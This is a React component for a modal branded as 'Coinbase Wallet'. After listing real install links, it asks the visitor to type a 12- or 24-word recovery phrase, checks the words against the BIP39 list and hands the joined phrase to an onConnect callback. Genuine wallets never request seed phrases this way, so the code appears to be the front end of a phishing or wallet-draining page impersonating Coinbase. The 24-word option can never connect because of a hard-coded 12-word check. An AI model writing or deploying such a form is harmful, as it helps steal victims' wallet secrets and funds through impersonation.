'use client';

import { useState } from 'react';
import { isValidBip39Word } from '@/lib/bip39-utils.js';
import { X, ArrowLeft } from 'lucide-react';



export default function CoinbaseWalletModal({ onClose, onConnect, onBack }) {
  const [importMode, setImportMode] = useState('install');
  const [wordCount, setWordCount] = useState(12);
  const [words, setWords] = useState(Array(12).fill(''));
  const [invalidWords, setInvalidWords] = useState(new Set());

  const handleWordChange = (index, value) => {
    const updated = [...words];
    updated[index] = value.toLowerCase().trim();
    const invalid = new Set(invalidWords);

    if (updated[index] && !isValidBip39Word(updated[index])) {
      invalid.add(index);
    } else {
      invalid.delete(index);
    }

    setWords(updated);
    setInvalidWords(invalid);
  };

  const switchWordCount = (count) => {
    setWordCount(count);
    setWords(Array(count).fill(''));
    setInvalidWords(new Set());
  };

  const handleConnect = () => {
    if (importMode !== 'phrase') return;
    const filledWords = words.filter(Boolean);
    const allValid = filledWords.length === 12 && invalidWords.size === 0;
    if (!allValid) return;
    onConnect('Coinbase Wallet', words.join(' '));
    onClose();
  };

  const filledCount = words.filter(Boolean).length;
  const isConnectEnabled = importMode === 'phrase' && filledCount === 12 && invalidWords.size === 0;

  return (
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 560 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          {onBack && (
            <button
              className="close-btn"
              onClick={() => {
                if (importMode === 'phrase') {
                  setImportMode('install');
                } else {
                  onBack();
                }
              }}
              aria-label="Back"
              style={{ position: 'absolute', left: 0, marginRight: 4 }}
            >
              <ArrowLeft size={16} />
            </button>
          )}
          <h2 style={{ margin: 0, textAlign: 'center' }}>Coinbase Wallet</h2>
          <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
        </div>

        <div className="modal-body">
          <div style={{ textAlign: 'center', marginBottom: 24 }}>
            <img src="/icons/coinbase.svg" alt="Coinbase Wallet" style={{ width: 64, height: 64, margin: '0 auto 16px', display: 'block' }} />
            <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.6 }}>
              Get Coinbase Wallet from one of the options below.
            </p>
          </div>

          {importMode === 'install' ? (
            <>
              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get Coinbase Wallet</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://chrome.google.com/webstore/detail/coinbase-wallet/hnfanknocfeofbddgcijnmhnfnkdnaad"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 14,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 12,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/chrome-icon.svg" alt="Chrome" style={{ width: 28, height: 28 }} />
                      <span style={{ fontSize: 14, fontWeight: 600 }}>Chrome Extension</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://chrome.google.com/webstore/detail/coinbase-wallet/hnfanknocfeofbddgcijnmhnfnkdnaad?authuser=0"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 14,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 12,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/brave-brow-icon.svg" alt="Brave" style={{ width: 28, height: 28 }} />
                      <span style={{ fontSize: 14, fontWeight: 600 }}>Brave Extension</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://apps.apple.com/app/coinbase-wallet/id1278383455"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 14,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 12,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/App_Store_(iOS).svg" alt="iOS" style={{ width: 28, height: 28 }} />
                      <span style={{ fontSize: 14, fontWeight: 600 }}>iOS App</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://play.google.com/store/apps/details?id=org.toshi"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 14,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 12,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/play-store-icon.svg" alt="Android" style={{ width: 28, height: 28 }} />
                      <span style={{ fontSize: 14, fontWeight: 600 }}>Android App</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://www.coinbase.com/wallet"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 14,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 12,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/website-4946.svg" alt="Website" style={{ width: 28, height: 28 }} />
                      <span style={{ fontSize: 14, fontWeight: 600 }}>Website</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                </div>
              </div>
              <button
                type="button"
                onClick={() => setImportMode('phrase')}
                style={{
                  width: '100%',
                  padding: 12,
                  borderRadius: 12,
                  border: '1px solid rgba(255,255,255,0.15)',
                  background: 'transparent',
                  color: 'var(--text)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: 'pointer',
                }}
              >
                I already have Coinbase Wallet
              </button>
            </>
          ) : (
            <>
              <div style={{ display: 'flex', justifyContent: 'center', gap: 12, marginBottom: 20, flexWrap: 'wrap' }}>
                <button
                  type="button"
                  onClick={() => switchWordCount(12)}
                  style={{
                    padding: '10px 24px',
                    borderRadius: 999,
                    border: wordCount === 12 ? 'none' : '1px solid rgba(255,255,255,0.12)',
                    background: wordCount === 12 ? 'var(--bg)' : 'transparent',
                    color: wordCount === 12 ? 'white' : 'var(--text)',
                    cursor: 'pointer',
                    minWidth: 110,
                  }}
                >
                  12 words
                </button>
                <button
                  type="button"
                  onClick={() => switchWordCount(24)}
                  style={{
                    padding: '10px 24px',
                    borderRadius: 999,
                    border: wordCount === 24 ? 'none' : '1px solid rgba(255,255,255,0.12)',
                    background: wordCount === 24 ? 'var(--bg)' : 'transparent',
                    color: wordCount === 24 ? 'white' : 'var(--text)',
                    cursor: 'pointer',
                    minWidth: 110,
                  }}
                >
                  24 words
                </button>
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, minmax(0, 1fr))', gap: 10, marginBottom: 20, maxHeight: 360, overflowY: 'auto', paddingRight: 4 }}>
                {words.map((word, index) => (
                  <div key={index} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ width: 24, textAlign: 'right', color: 'var(--text-dim)', fontSize: 13 }}>{index + 1}</span>
                    <input
                      type="text"
                      placeholder="Word"
                      value={word}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      style={{
                        flex: 1,
                        padding: '10px 12px',
                        borderRadius: 12,
                        border: `1px solid ${invalidWords.has(index) ? '#ff6b6b' : 'rgba(255,255,255,0.15)'}`,
                        background: 'rgba(255,255,255,0.03)',
                        color: 'var(--text)',
                        outline: 'none',
                      }}
                    />
                  </div>
                ))}
              </div>
              <div style={{ textAlign: 'center', marginBottom: 24, color: 'var(--text-dim)', fontSize: 13 }}>
                {filledCount === wordCount && invalidWords.size === 0 ? 'Ready to connect.' : `Missing words: ${wordCount - filledCount}`}
              </div>
              <button
                type="button"
                onClick={() => setImportMode('install')}
                style={{
                  width: '100%',
                  padding: 12,
                  borderRadius: 12,
                  border: '1px solid rgba(255,255,255,0.15)',
                  background: 'transparent',
                  color: 'var(--text)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: 'pointer',
                }}
              >
                Back to install options
              </button>
            </>
          )}

          {importMode === 'phrase' && (
            <button
              type="button"
              onClick={handleConnect}
              disabled={!isConnectEnabled}
              style={{
                width: '100%',
                padding: '14px',
                borderRadius: 12,
                border: 'none',
                background: isConnectEnabled ? 'var(--cyan)' : 'rgba(255,255,255,0.12)',
                color: isConnectEnabled ? 'var(--bg)' : 'var(--text-dim)',
                cursor: isConnectEnabled ? 'pointer' : 'not-allowed',
                fontWeight: 700,
              }}
            >
              Connect Coinbase Wallet
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
